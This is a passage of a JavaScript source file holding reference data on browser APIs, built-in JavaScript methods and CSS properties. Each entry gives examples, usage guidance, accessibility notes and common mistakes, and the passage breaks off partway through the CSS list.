      example: 'navigator.geolocation.getCurrentPosition(\n  position => {\n    const lat = position.coords.latitude;\n    const lng = position.coords.longitude;\n    console.log("Location:", lat, lng);\n  },\n  error => {\n    console.error("Geolocation error:", error.message);\n  },\n  {\n    enableHighAccuracy: true,\n    timeout: 5000\n  }\n);\n\n// Watch position:\nconst watchId = navigator.geolocation.watchPosition(...);\nnavigator.geolocation.clearWatch(watchId);',
      whenUse: 'Maps. Local services. Weather.',
      whenAvoid: 'Without user consent. Stored in plaintext.',
      a11yNotes: 'Permission prompt is browser-controlled.',
      browserSupport: 'All modern browsers (HTTPS required)',
      commonMistakes: ['Not handling permission denied', 'Not handling timeout', 'Privacy concerns'],
    },
    {
      method: 'window.matchMedia()',
      whatItDoes: 'Match a CSS media query in JavaScript.',
      returns: 'MediaQueryList',
      params: 'CSS media query string',
      example: '// Detect reduced motion preference:\nconst reduceMotion = window.matchMedia("(prefers-reduced-motion: reduce)");\nif (reduceMotion.matches) {\n  // Disable animation\n}\n\n// Listen for changes:\nreduceMotion.addEventListener("change", e => {\n  console.log("Changed:", e.matches);\n});\n\n// Dark mode detection:\nconst dark = window.matchMedia("(prefers-color-scheme: dark)");\nif (dark.matches) document.body.classList.add("dark");',
      whenUse: 'Responsive logic. Accessibility preferences. Theme switching.',
      whenAvoid: 'For pure CSS (use @media in CSS).',
      a11yNotes: 'Critical for honoring user accessibility preferences.',
      browserSupport: 'All modern browsers',
      commonMistakes: ['Not listening for changes (just checking once)', 'Forgetting to clean up listeners'],
    },
  ];

  // ─── JavaScript built-in methods reference (verbose) ──────────────
  var JS_METHODS_REFERENCE = [
    {
      method: 'Array.prototype.map()',
      type: 'Array method',
      whatItDoes: 'Creates a new array with the results of calling a function on every element.',
      returns: 'New array with transformed elements',
      mutates: 'No (returns new array)',
      signature: 'arr.map(callback(element, index, array))',
      example: 'const numbers = [1, 2, 3, 4];\nconst doubled = numbers.map(n => n * 2);\n// doubled = [2, 4, 6, 8]\n// numbers = [1, 2, 3, 4] (unchanged)',
      whenUse: 'When transforming each item in an array to something else.',
      whenAvoid: 'When you don\'t need a new array (use forEach). When you want to filter (use filter).',
      complexity: 'O(n)',
      browserSupport: 'All modern browsers',
    },
    {
      method: 'Array.prototype.filter()',
      type: 'Array method',
      whatItDoes: 'Creates a new array with elements that pass a test.',
      returns: 'New array with matching elements (or empty)',
      mutates: 'No',
      signature: 'arr.filter(callback(element, index, array))',
      example: 'const numbers = [1, 2, 3, 4, 5];\nconst evens = numbers.filter(n => n % 2 === 0);\n// evens = [2, 4]\n\nconst users = [{age: 20}, {age: 15}, {age: 25}];\nconst adults = users.filter(u => u.age >= 18);\n// adults = [{age: 20}, {age: 25}]',
      whenUse: 'When selecting a subset of items.',
      whenAvoid: 'When you want one item (use find). When transforming (use map).',
      complexity: 'O(n)',
      browserSupport: 'All modern browsers',
    },
    {
      method: 'Array.prototype.reduce()',
      type: 'Array method',
      whatItDoes: 'Reduces an array to a single value by applying a function to each element.',
      returns: 'Single accumulated value',
      mutates: 'No',
      signature: 'arr.reduce(callback(accumulator, currentValue, index, array), initialValue)',
      example: 'const numbers = [1, 2, 3, 4];\nconst sum = numbers.reduce((acc, n) => acc + n, 0);\n// sum = 10\n\nconst grouped = ["a", "b", "a", "c"].reduce((acc, item) => {\n  acc[item] = (acc[item] || 0) + 1;\n  return acc;\n}, {});\n// grouped = {a: 2, b: 1, c: 1}',
      whenUse: 'When you need to combine all items into one value (sum, count, group).',
      whenAvoid: 'When map or filter would be clearer.',
      complexity: 'O(n)',
      browserSupport: 'All modern browsers',
    },
    {
      method: 'Array.prototype.forEach()',
      type: 'Array method',
      whatItDoes: 'Executes a function for each element. Doesn\'t return anything useful.',
      returns: 'undefined',
      mutates: 'No (but the callback may have side effects)',
      signature: 'arr.forEach(callback(element, index, array))',
      example: 'const colors = ["red", "green", "blue"];\ncolors.forEach((color, i) => {\n  console.log(`${i}: ${color}`);\n});\n// Logs: 0: red, 1: green, 2: blue',
      whenUse: 'When you need side effects (logging, DOM manipulation) for each item.',
      whenAvoid: 'When you need a new array (use map). When you need to break early (use for...of).',
      complexity: 'O(n)',
      browserSupport: 'All modern browsers',
    },
    {
      method: 'Array.prototype.find()',
      type: 'Array method',
      whatItDoes: 'Returns the first element matching a condition (or undefined).',
      returns: 'First matching element or undefined',
      mutates: 'No',
      signature: 'arr.find(callback(element, index, array))',
      example: 'const users = [{id: 1, name: "Alice"}, {id: 2, name: "Bob"}];\nconst alice = users.find(u => u.name === "Alice");\n// alice = {id: 1, name: "Alice"}\n\nconst notFound = users.find(u => u.name === "Charlie");\n// notFound = undefined',
      whenUse: 'When you need exactly one item.',
      whenAvoid: 'When you want all matches (use filter).',
      complexity: 'O(n)',
      browserSupport: 'All modern browsers',
    },
    {
      method: 'Array.prototype.some()',
      type: 'Array method',
      whatItDoes: 'Returns true if at least one element passes a test.',
      returns: 'Boolean',
      mutates: 'No',
      signature: 'arr.some(callback(element, index, array))',
      example: 'const numbers = [1, 2, 3, 4];\nconst hasEven = numbers.some(n => n % 2 === 0);\n// hasEven = true\n\nconst users = [{verified: false}, {verified: true}];\nconst hasVerified = users.some(u => u.verified);\n// hasVerified = true',
      whenUse: 'When checking "does any item match?"',
      whenAvoid: 'When checking "do all items match?" (use every).',
      complexity: 'O(n) worst case, often less',
      browserSupport: 'All modern browsers',
    },
    {
      method: 'Array.prototype.every()',
      type: 'Array method',
      whatItDoes: 'Returns true if all elements pass a test.',
      returns: 'Boolean',
      mutates: 'No',
      signature: 'arr.every(callback(element, index, array))',
      example: 'const numbers = [2, 4, 6, 8];\nconst allEven = numbers.every(n => n % 2 === 0);\n// allEven = true\n\nconst ages = [18, 20, 15];\nconst allAdult = ages.every(age => age >= 18);\n// allAdult = false',
      whenUse: 'When checking "do all items match?"',
      whenAvoid: 'When checking "does any item match?" (use some).',
      complexity: 'O(n) worst case, often less',
      browserSupport: 'All modern browsers',
    },
    {
      method: 'Array.prototype.sort()',
      type: 'Array method',
      whatItDoes: 'Sorts elements in place + returns array.',
      returns: 'Same array (sorted)',
      mutates: 'YES — modifies original array',
      signature: 'arr.sort((a, b) => -1 | 0 | 1)',
      example: '// Default — sorts as strings!\nconst nums = [10, 2, 1, 20];\nnums.sort(); // [1, 10, 2, 20] (lexical)\n\n// Numeric sort\nnums.sort((a, b) => a - b); // [1, 2, 10, 20]\nnums.sort((a, b) => b - a); // [20, 10, 2, 1] (desc)\n\n// String sort\n["apple", "Apple"].sort(); // ["Apple", "apple"] (case-sensitive)\n["apple", "Apple"].sort((a, b) => a.toLowerCase().localeCompare(b.toLowerCase()));',
      whenUse: 'When you need ordered data.',
      whenAvoid: 'When you need to keep original (clone first: [...arr].sort()).',
      complexity: 'O(n log n) on modern engines',
      browserSupport: 'All browsers',
    },
    {
      method: 'Array.prototype.indexOf() / lastIndexOf()',
      type: 'Array method',
      whatItDoes: 'Returns index of first/last occurrence of element, or -1 if not found.',
      returns: 'Number (index) or -1',
      mutates: 'No',
      signature: 'arr.indexOf(searchElement, fromIndex?)',
      example: 'const items = ["apple", "banana", "cherry"];\nconst i = items.indexOf("banana"); // 1\nconst j = items.indexOf("date"); // -1\n\n// Test if includes:\nif (items.indexOf("apple") !== -1) { /* ... */ }\n// Or use .includes():\nif (items.includes("apple")) { /* ... */ }',
      whenUse: 'When you need the index of an element.',
      whenAvoid: 'When you just need a boolean (use includes). For objects (use findIndex with comparison).',
      complexity: 'O(n)',
      browserSupport: 'All browsers',
    },
    {
      method: 'Array.prototype.push() / pop()',
      type: 'Array method',
      whatItDoes: 'push() adds to end. pop() removes from end.',
      returns: 'push: new length. pop: removed element.',
      mutates: 'YES',
      signature: 'arr.push(...items) and arr.pop()',
      example: 'const stack = [1, 2, 3];\nstack.push(4); // [1, 2, 3, 4]\nconst top = stack.pop(); // top = 4, stack = [1, 2, 3]',
      whenUse: 'Implementing stack-like behavior.',
      whenAvoid: 'When you don\'t want to mutate the original.',
      complexity: 'O(1)',
      browserSupport: 'All browsers',
    },
    {
      method: 'Array.prototype.shift() / unshift()',
      type: 'Array method',
      whatItDoes: 'shift() removes from start. unshift() adds to start.',
      returns: 'shift: removed element. unshift: new length.',
      mutates: 'YES',
      signature: 'arr.shift() and arr.unshift(...items)',
      example: 'const queue = [1, 2, 3];\nqueue.unshift(0); // [0, 1, 2, 3]\nconst first = queue.shift(); // first = 0, queue = [1, 2, 3]',
      whenUse: 'Implementing queue-like behavior.',
      whenAvoid: 'Performance-sensitive — O(n) because all elements shift.',
      complexity: 'O(n)',
      browserSupport: 'All browsers',
    },
    {
      method: 'Array.prototype.slice() / splice()',
      type: 'Array method',
      whatItDoes: 'slice() returns shallow copy of portion. splice() removes/inserts in place.',
      returns: 'slice: new array. splice: removed elements.',
      mutates: 'slice: no. splice: YES.',
      signature: 'arr.slice(start, end?) and arr.splice(start, deleteCount, ...items)',
      example: 'const arr = [1, 2, 3, 4, 5];\nconst copy = arr.slice(); // [1, 2, 3, 4, 5] (full copy)\nconst part = arr.slice(1, 3); // [2, 3]\n\n// splice modifies original:\narr.splice(1, 2); // arr = [1, 4, 5], returned [2, 3]\narr.splice(1, 0, 99); // arr = [1, 99, 4, 5], inserts 99 at index 1',
      whenUse: 'slice: extracting parts. splice: modifying in place.',
      whenAvoid: 'splice when you don\'t want to mutate.',
      complexity: 'O(n)',
      browserSupport: 'All browsers',
    },
    {
      method: 'Array.prototype.concat()',
      type: 'Array method',
      whatItDoes: 'Combines arrays into a new array.',
      returns: 'New array',
      mutates: 'No',
      signature: 'arr.concat(...arrays)',
      example: 'const a = [1, 2];\nconst b = [3, 4];\nconst combined = a.concat(b); // [1, 2, 3, 4]\nconst withItem = a.concat(99, b); // [1, 2, 99, 3, 4]\n\n// Modern alternative:\nconst combined2 = [...a, ...b]; // Same result',
      whenUse: 'Joining arrays.',
      whenAvoid: 'Modern code prefers spread operator.',
      complexity: 'O(n+m)',
      browserSupport: 'All browsers',
    },
    {
      method: 'Array.prototype.join()',
      type: 'Array method',
      whatItDoes: 'Joins array elements into a string with separator.',
      returns: 'String',
      mutates: 'No',
      signature: 'arr.join(separator?)',
      example: 'const words = ["Hello", "World"];\nwords.join(); // "Hello,World" (default: comma)\nwords.join(" "); // "Hello World"\nwords.join(""); // "HelloWorld"\nwords.join(", "); // "Hello, World"\n\n// CSV building:\nconst rows = [["Name", "Age"], ["Alice", 30]];\nrows.map(r => r.join(",")).join("\\n");',
      whenUse: 'Creating strings from arrays.',
      whenAvoid: 'When you need a custom delimiter handling.',
      complexity: 'O(n)',
      browserSupport: 'All browsers',
    },
    {
      method: 'Array.prototype.reverse()',
      type: 'Array method',
      whatItDoes: 'Reverses array in place.',
      returns: 'Same array (reversed)',
      mutates: 'YES',
      signature: 'arr.reverse()',
      example: 'const arr = [1, 2, 3];\narr.reverse(); // arr = [3, 2, 1]\n\n// Non-mutating alternative:\nconst reversed = [...arr].reverse();',
      whenUse: 'When you need reverse order.',
      whenAvoid: 'When original order matters.',
      complexity: 'O(n)',
      browserSupport: 'All browsers',
    },
    {
      method: 'Array.from()',
      type: 'Array static',
      whatItDoes: 'Creates a new array from an iterable or array-like.',
      returns: 'New array',
      mutates: 'No',
      signature: 'Array.from(iterable, mapFn?, thisArg?)',
      example: '// From string:\nArray.from("hello"); // ["h", "e", "l", "l", "o"]\n\n// From Set:\nArray.from(new Set([1, 2, 2, 3])); // [1, 2, 3]\n\n// With map:\nArray.from({length: 5}, (_, i) => i * 2); // [0, 2, 4, 6, 8]\n\n// From NodeList:\nArray.from(document.querySelectorAll("p"));',
      whenUse: 'Converting iterables to arrays.',
      whenAvoid: 'When source is already array.',
      complexity: 'O(n)',
      browserSupport: 'All modern browsers',
    },
    {
      method: 'Array.isArray()',
      type: 'Array static',
      whatItDoes: 'Checks if value is an array.',
      returns: 'Boolean',
      mutates: 'No',
      signature: 'Array.isArray(value)',
      example: 'Array.isArray([1, 2, 3]); // true\nArray.isArray("string"); // false\nArray.isArray({0: 1, length: 1}); // false (array-like but not array)\nArray.isArray(new Array(5)); // true',
      whenUse: 'Type-checking before using array methods.',
      whenAvoid: 'When TypeScript or similar type-checking is in use.',
      complexity: 'O(1)',
      browserSupport: 'All modern browsers',
    },
    {
      method: 'String.prototype.split()',
      type: 'String method',
      whatItDoes: 'Splits a string into an array based on separator.',
      returns: 'Array of strings',
      mutates: 'No',
      signature: 'str.split(separator, limit?)',
      example: 'const csv = "apple,banana,cherry";\nconst items = csv.split(","); // ["apple", "banana", "cherry"]\n\nconst sentence = "Hello World";\nconst words = sentence.split(" "); // ["Hello", "World"]\n\n// Limit:\n"a,b,c,d,e".split(",", 3); // ["a", "b", "c"]\n\n// Empty separator:\n"hello".split(""); // ["h", "e", "l", "l", "o"]',
      whenUse: 'Parsing structured strings into arrays.',
      whenAvoid: 'For complex parsing (use proper parser).',
      complexity: 'O(n)',
      browserSupport: 'All browsers',
    },
    {
      method: 'String.prototype.replace()',
      type: 'String method',
      whatItDoes: 'Replaces matched substring(s) with new string.',
      returns: 'New string (original unchanged)',
      mutates: 'No',
      signature: 'str.replace(search, replacement)',
      example: 'const text = "Hello World";\n\n// Simple replacement:\ntext.replace("World", "Earth"); // "Hello Earth"\n\n// Regex (only first match by default):\n"foo foo foo".replace(/foo/, "bar"); // "bar foo foo"\n\n// Replace all (regex with g flag, or replaceAll):\n"foo foo foo".replace(/foo/g, "bar"); // "bar bar bar"\n"foo foo foo".replaceAll("foo", "bar"); // "bar bar bar"\n\n// With function:\n"abc".replace(/./g, ch => ch.toUpperCase()); // "ABC"',
      whenUse: 'Substituting parts of strings.',
      whenAvoid: 'For very complex transformations (use parser).',
      complexity: 'O(n)',
      browserSupport: 'All browsers (replaceAll: modern)',
    },
    {
      method: 'String.prototype.trim()',
      type: 'String method',
      whatItDoes: 'Removes whitespace from both ends.',
      returns: 'New string',
      mutates: 'No',
      signature: 'str.trim()',
      example: 'const dirty = "   Hello World   ";\nconst clean = dirty.trim(); // "Hello World"\n\n// Trim from one side only:\ndirty.trimStart(); // "Hello World   "\ndirty.trimEnd(); // "   Hello World"',
      whenUse: 'Cleaning user input.',
      whenAvoid: 'When you need internal whitespace preserved.',
      complexity: 'O(n)',
      browserSupport: 'All browsers',
    },
    {
      method: 'String.prototype.toUpperCase() / toLowerCase()',
      type: 'String method',
      whatItDoes: 'Converts case.',
      returns: 'New string',
      mutates: 'No',
      signature: 'str.toUpperCase() and str.toLowerCase()',
      example: '"hello".toUpperCase(); // "HELLO"\n"WORLD".toLowerCase(); // "world"\n\n// Case-insensitive comparison:\n"hello".toLowerCase() === "HELLO".toLowerCase(); // true',
      whenUse: 'Case normalization (search, comparison).',
      whenAvoid: 'For locale-specific case (use toLocaleLowerCase).',
      complexity: 'O(n)',
      browserSupport: 'All browsers',
    },
    {
      method: 'String.prototype.includes()',
      type: 'String method',
      whatItDoes: 'Checks if string contains substring.',
      returns: 'Boolean',
      mutates: 'No',
      signature: 'str.includes(search, position?)',
      example: 'const url = "https://example.com/page";\nurl.includes("example.com"); // true\nurl.includes("HTTP"); // false (case-sensitive)\n\n// Position:\n"hello world".includes("hello", 1); // false (starts from index 1)',
      whenUse: 'Quick "does this contain that?" check.',
      whenAvoid: 'When you need position (use indexOf).',
      complexity: 'O(n)',
      browserSupport: 'All modern browsers',
    },
    {
      method: 'String.prototype.startsWith() / endsWith()',
      type: 'String method',
      whatItDoes: 'Checks if string starts/ends with substring.',
      returns: 'Boolean',
      mutates: 'No',
      signature: 'str.startsWith(search) and str.endsWith(search)',
      example: 'const url = "https://example.com/page";\nurl.startsWith("https://"); // true\nurl.endsWith(".html"); // false\nurl.endsWith("/page"); // true',
      whenUse: 'Validation, prefix/suffix matching.',
      whenAvoid: 'For complex pattern matching (use regex).',
      complexity: 'O(n)',
      browserSupport: 'All modern browsers',
    },
    {
      method: 'JSON.stringify()',
      type: 'JSON static',
      whatItDoes: 'Converts JS object to JSON string.',
      returns: 'String',
      mutates: 'No',
      signature: 'JSON.stringify(value, replacer?, indent?)',
      example: 'const obj = {name: "Alice", age: 30};\nJSON.stringify(obj); // \'{"name":"Alice","age":30}\'\n\n// With indentation:\nJSON.stringify(obj, null, 2);\n// {\n//   "name": "Alice",\n//   "age": 30\n// }\n\n// With replacer (filter keys):\nJSON.stringify(obj, ["name"]); // \'{"name":"Alice"}\'',
      whenUse: 'Saving objects to localStorage, sending in API requests, logging.',
      whenAvoid: 'Functions + undefined are lost. Circular references throw.',
      complexity: 'O(n)',
      browserSupport: 'All browsers',
    },
    {
      method: 'JSON.parse()',
      type: 'JSON static',
      whatItDoes: 'Converts JSON string to JS object.',
      returns: 'Object/array/primitive',
      mutates: 'No',
      signature: 'JSON.parse(text, reviver?)',
      example: 'const text = \'{"name":"Alice","age":30}\';\nconst obj = JSON.parse(text); // {name: "Alice", age: 30}\n\n// Always wrap in try/catch:\ntry {\n  const data = JSON.parse(maybeBadJson);\n} catch (e) {\n  console.error("Invalid JSON:", e);\n}',
      whenUse: 'Reading from localStorage, parsing API responses.',
      whenAvoid: 'Always wrap in try/catch — throws on invalid JSON.',
      complexity: 'O(n)',
      browserSupport: 'All browsers',
    },
    {
      method: 'Math.random()',
      type: 'Math static',
      whatItDoes: 'Returns a random float between 0 (inclusive) and 1 (exclusive).',
      returns: 'Number',
      mutates: 'No',
      signature: 'Math.random()',
      example: 'Math.random(); // e.g., 0.737\n\n// Random integer in range:\nfunction randInt(min, max) {\n  return Math.floor(Math.random() * (max - min + 1)) + min;\n}\nrandInt(1, 10); // 1 to 10 inclusive',
      whenUse: 'Games, randomization, sampling.',
      whenAvoid: 'Cryptographic use (use crypto.getRandomValues).',
      complexity: 'O(1)',
      browserSupport: 'All browsers',
    },
    {
      method: 'Math.floor() / Math.ceil() / Math.round()',
      type: 'Math static',
      whatItDoes: 'Rounding: floor down, ceil up, round nearest.',
      returns: 'Number',
      mutates: 'No',
      signature: 'Math.floor(x), Math.ceil(x), Math.round(x)',
      example: 'Math.floor(3.7); // 3\nMath.ceil(3.2); // 4\nMath.round(3.5); // 4\nMath.round(3.4); // 3\nMath.round(-3.5); // -3 (rounds toward positive infinity)',
      whenUse: 'When you need integer values from floats.',
      whenAvoid: 'When precision matters more than rounding direction.',
      complexity: 'O(1)',
      browserSupport: 'All browsers',
    },
    {
      method: 'Date constructor + methods',
      type: 'Date',
      whatItDoes: 'Creates + manipulates date/time values.',
      returns: 'Date object',
      mutates: 'Most setter methods mutate',
      signature: 'new Date() | new Date(timestamp) | new Date(year, month, day, ...)',
      example: 'const now = new Date();\nnew Date().getTime(); // milliseconds since epoch\nnew Date().toISOString(); // "2026-05-16T..."\n\n// Add 1 day:\nconst tomorrow = new Date();\ntomorrow.setDate(tomorrow.getDate() + 1);\n\n// Days between two dates:\nconst diff = (date2 - date1) / (1000 * 60 * 60 * 24);',
      whenUse: 'Date/time handling.',
      whenAvoid: 'Complex date math (use date-fns or Day.js).',
      complexity: 'O(1)',
      browserSupport: 'All browsers',
    },
    {
      method: 'setTimeout() / setInterval()',
      type: 'Timer global',
      whatItDoes: 'setTimeout: run once after delay. setInterval: run repeatedly.',
      returns: 'Timer ID (for cancellation)',
      mutates: 'No',
      signature: 'setTimeout(fn, ms) and setInterval(fn, ms)',
      example: 'const tid = setTimeout(() => {\n  console.log("After 1 second");\n}, 1000);\n\n// Cancel:\nclearTimeout(tid);\n\n// Repeated:\nconst iid = setInterval(() => {\n  console.log("Every 1 second");\n}, 1000);\n\nclearInterval(iid);',
      whenUse: 'Delayed actions, polling, animation.',
      whenAvoid: 'Use requestAnimationFrame for animation. Use fetch for one-shot fetching.',
      complexity: 'O(1)',
      browserSupport: 'All browsers',
    },
    {
      method: 'fetch()',
      type: 'Network global',
      whatItDoes: 'Makes HTTP requests.',
      returns: 'Promise (resolves to Response)',
      mutates: 'No',
      signature: 'fetch(url, options?)',
      example: '// GET request:\nfetch("/api/data")\n  .then(response => response.json())\n  .then(data => console.log(data));\n\n// Or with async/await:\nconst response = await fetch("/api/data");\nconst data = await response.json();\n\n// POST request:\nfetch("/api/users", {\n  method: "POST",\n  headers: {"Content-Type": "application/json"},\n  body: JSON.stringify({name: "Alice"})\n});',
      whenUse: 'HTTP requests in modern web apps.',
      whenAvoid: 'Old IE (use XMLHttpRequest polyfill).',
      complexity: 'I/O bound',
      browserSupport: 'All modern browsers',
    },
  ];

  // ─── CSS property reference (40+ properties with full docs) ───────
  var CSS_FULL_REFERENCE = [
    {
      property: 'background',
      shorthand: true,
      whatItDoes: 'Sets background color, image, position, size, repeat, and origin in one declaration.',
      values: 'background: color image position/size repeat origin clip attachment;',
      defaultValue: 'transparent',
      inherits: 'no',
      animatable: 'partially',
      a11yNotes: 'Background images don\'t have alt text. Use foreground images for meaningful content.',
      example: '/* Solid color */\nbody { background: #f3f4f6; }\n\n/* Image with fallback color */\n.hero { background: #2563eb url("hero.jpg") center/cover no-repeat; }\n\n/* Multiple backgrounds */\n.layered { background: linear-gradient(180deg, transparent, #000) center/cover, url("bg.jpg"); }',
      browserSupport: 'All browsers',
      commonMistakes: ['Background as ONLY color indicator (use icons + labels too)', 'Background image without fallback color', 'Background image as meaningful content'],
    },
    {
      property: 'border',
      shorthand: true,
      whatItDoes: 'Sets border width, style, and color in one declaration.',
      values: 'border: width style color;',
      defaultValue: 'medium none currentColor',
      inherits: 'no',
      animatable: 'partially',
      a11yNotes: 'Don\'t use color alone to convey meaning.',
      example: '.input { border: 1px solid #d1d5db; }\n.input:focus { border: 2px solid #2563eb; }\n.error { border: 1px solid #dc2626; }\n.tab.active { border-bottom: 3px solid #2563eb; }',
      browserSupport: 'All browsers',
      commonMistakes: ['Forgetting outline: none implications for focus', 'Using border for layout (use Grid/Flex)'],
    },
    {
      property: 'box-shadow',
      shorthand: false,
      whatItDoes: 'Adds shadow effects around elements.',
      values: 'box-shadow: x y blur spread color inset;',
      defaultValue: 'none',
      inherits: 'no',
      animatable: 'yes',
      a11yNotes: 'Shadows can affect color contrast. Test final visible state.',
      example: '/* Subtle shadow */\n.card { box-shadow: 0 2px 4px rgba(0,0,0,0.1); }\n\n/* Lifted */\n.elevated { box-shadow: 0 4px 12px rgba(0,0,0,0.15); }\n\n/* Inset */\n.recessed { box-shadow: inset 0 2px 4px rgba(0,0,0,0.1); }\n\n/* Focus ring */\n.button:focus { box-shadow: 0 0 0 3px rgba(37,99,235,0.4); }',
      browserSupport: 'All browsers',
      commonMistakes: ['Heavy shadows that look unrealistic', 'Multiple shadows that conflict', 'Forgetting to remove outline + replace with shadow'],
    },
    {
      property: 'box-sizing',
      shorthand: false,
      whatItDoes: 'Defines how the box model handles width + height — content-box or border-box.',
      values: 'box-sizing: content-box | border-box;',
      defaultValue: 'content-box',
      inherits: 'no',
      animatable: 'no',
      a11yNotes: 'No direct accessibility impact.',
      example: '/* Universal fix to make box-sizing predictable */\n*, *::before, *::after { box-sizing: border-box; }\n\n/* Why? With content-box: */\n.box { width: 100px; padding: 20px; border: 5px solid; }\n/* Total = 150px (content + padding + border) */\n\n/* With border-box: */\n/* Total = 100px (padding + border included in width) */',
      browserSupport: 'All modern browsers',
      commonMistakes: ['Mixing content-box + border-box', 'Not setting it globally'],
    },
    {
      property: 'color',
      shorthand: false,
      whatItDoes: 'Sets the foreground (text) color.',
      values: 'color: hex | rgb() | rgba() | hsl() | hsla() | named-color;',
      defaultValue: 'inherits',
      inherits: 'yes',
      animatable: 'yes',
      a11yNotes: 'WCAG 4.5:1 contrast for normal text, 3:1 for large/UI. Test with WebAIM Contrast Checker.',
      example: '/* Various color formats */\np { color: #1a1a1a; }\nbody { color: rgb(26, 26, 26); }\n.note { color: hsl(0, 0%, 35%); }\n.error { color: #dc2626; }\n\n/* Modern CSS variables */\n:root { --text: #1a1a1a; }\nbody { color: var(--text); }',
      browserSupport: 'All browsers',
      commonMistakes: ['Light gray text on white (low contrast)', 'Color as only indicator (use icons + text too)'],
    },
    {
      property: 'cursor',
      shorthand: false,
      whatItDoes: 'Sets the cursor type when hovering over an element.',
      values: 'auto | default | pointer | text | wait | crosshair | move | not-allowed | help | grab | grabbing',
      defaultValue: 'auto',
      inherits: 'yes',
      animatable: 'no',
      a11yNotes: 'Cursors signal interactivity. cursor: pointer means clickable.',
      example: 'button { cursor: pointer; }\n.disabled { cursor: not-allowed; }\n.draggable { cursor: grab; }\n.draggable:active { cursor: grabbing; }',
      browserSupport: 'All browsers',
      commonMistakes: ['cursor: pointer on non-clickable elements', 'No cursor change on disabled buttons'],
    },
    {
      property: 'display',
      shorthand: false,
      whatItDoes: 'Defines how an element renders in document flow.',
      values: 'block | inline | inline-block | flex | grid | none | contents | flow-root',
      defaultValue: 'inline',
      inherits: 'no',
      animatable: 'no',
      a11yNotes: 'display: none removes from accessibility tree. visibility: hidden also removes.',
      example: '/* Block-level (default for div, p, etc.) */\np { display: block; }\n\n/* Inline (default for span, a, etc.) */\nspan { display: inline; }\n\n/* Flexbox (1D layout) */\nnav { display: flex; gap: 16px; }\n\n/* Grid (2D layout) */\n.grid { display: grid; grid-template-columns: 1fr 1fr; }\n\n/* Hide */\n.hidden { display: none; }',
      browserSupport: 'All modern browsers',
      commonMistakes: ['Hiding focused elements (focus disappears)', 'Using display: none for content that should be hidden visually but accessible (use sr-only)'],
    },
    {
      property: 'flex',
      shorthand: true,
      whatItDoes: 'Shorthand for flex-grow, flex-shrink, flex-basis. Controls how a flex item grows/shrinks.',
      values: 'flex: grow shrink basis;',
      defaultValue: '0 1 auto',
      inherits: 'no',
      animatable: 'yes',
      a11yNotes: 'Visual order can differ from DOM order via flex-direction: row-reverse. Tab order follows DOM.',
      example: '.row { display: flex; gap: 12px; align-items: center; }\n\n/* Equal width children */\n.row > * { flex: 1; }\n\n/* Auto-size based on content */\n.row > .sidebar { flex: 0 0 200px; } /* Fixed 200px */\n.row > .main { flex: 1; } /* Fill remaining */',
      browserSupport: 'All modern browsers',
      commonMistakes: ['Reordering visual but breaking tab order', 'Confusing flex-grow vs flex-shrink'],
    },
    {
      property: 'font-family',
      shorthand: false,
      whatItDoes: 'Sets the font for text.',
      values: 'font-family: family1, family2, generic-family;',
      defaultValue: 'browser default',
      inherits: 'yes',
      animatable: 'no',
      a11yNotes: 'Use system fonts for performance. Avoid icon fonts where SVG works.',
      example: '/* System font stack */\nbody { font-family: system-ui, -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, sans-serif; }\n\n/* Web fonts */\n@font-face { font-family: "MyFont"; src: url("font.woff2") format("woff2"); }\nh1 { font-family: "MyFont", Georgia, serif; }',
      browserSupport: 'All browsers',
      commonMistakes: ['Single font with no fallback', 'Loading too many web fonts (performance)'],
    },
    {
      property: 'font-size',
      shorthand: false,
      whatItDoes: 'Sets the text size.',
      values: 'font-size: keyword | length | percentage | math;',
      defaultValue: 'medium (typically 16px)',
      inherits: 'yes',
      animatable: 'yes',
      a11yNotes: 'Use rem or em (NOT px alone). Allow user font scaling. 16px+ for body text.',
      example: '/* Root size */\nhtml { font-size: 16px; }\n\n/* Body */\nbody { font-size: 1rem; } /* = 16px */\n\n/* Headings */\nh1 { font-size: 2rem; } /* = 32px */\nh2 { font-size: 1.5rem; } /* = 24px */\n\n/* Responsive */\n@media (min-width: 768px) { html { font-size: 18px; } }',
      browserSupport: 'All browsers',
      commonMistakes: ['Hardcoded pixel sizes', 'Fonts too small (under 14px) for body text', 'Fonts that don\'t scale with user preferences'],
    },
    {
      property: 'font-weight',
      shorthand: false,
      whatItDoes: 'Sets the boldness of the font.',
      values: 'font-weight: normal | bold | bolder | lighter | 100 | 200 | ... | 900',
      defaultValue: 'normal (400)',
      inherits: 'yes',
      animatable: 'yes',
      a11yNotes: 'Bold text can be more readable. Use 600+ for strong emphasis.',
      example: 'p { font-weight: 400; } /* Normal */\nstrong { font-weight: 700; } /* Bold */\nh1 { font-weight: 800; } /* Extra bold */',
      browserSupport: 'All browsers',
      commonMistakes: ['Using font-weight: bolder than the font supports', 'Variable weight fonts not configured'],
    },
    {
      property: 'gap',
      shorthand: false,
      whatItDoes: 'Sets the space between flex/grid items.',
      values: 'gap: row column; OR gap: same-amount;',
      defaultValue: '0',
      inherits: 'no',
      animatable: 'yes',
      a11yNotes: 'Adequate spacing helps users with low vision.',
      example: '.row { display: flex; gap: 16px; }\n.grid { display: grid; grid-template-columns: 1fr 1fr; gap: 24px; }',
      browserSupport: 'All modern browsers',
      commonMistakes: ['Using margin on items (gap is cleaner)', 'Inconsistent gap values across components'],
    },
    {
      property: 'grid-template-columns',
      shorthand: false,
      whatItDoes: 'Defines columns in a CSS grid.',
      values: 'auto | length | percentage | fr | repeat() | minmax()',
      defaultValue: 'none',
      inherits: 'no',
      animatable: 'no',
      a11yNotes: 'Visual order can differ from DOM order. Tab order follows DOM.',
      example: '/* Three equal columns */\n.grid { display: grid; grid-template-columns: 1fr 1fr 1fr; }\n\n/* Responsive — fits as many columns as space allows */\n.responsive-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(250px, 1fr)); }\n\n/* Named lines */\n.layout { display: grid; grid-template-columns: [start] 200px [content-start] 1fr [content-end] 200px [end]; }',
      browserSupport: 'All modern browsers',
      commonMistakes: ['Fixed widths that don\'t adapt', 'Using grid when flex would be simpler'],
    },
    {
      property: 'height',
      shorthand: false,
      whatItDoes: 'Sets element height.',
      values: 'auto | length | percentage | min-content | max-content | fit-content',
      defaultValue: 'auto',
      inherits: 'no',
      animatable: 'yes',
      a11yNotes: 'Fixed heights can clip text when fonts scale. Prefer min-height.',
      example: '/* Fixed */\n.box { height: 200px; }\n\n/* Viewport */\n.hero { height: 100vh; }\n\n/* Min height (allows content to grow) */\n.card { min-height: 200px; }',
      browserSupport: 'All browsers',
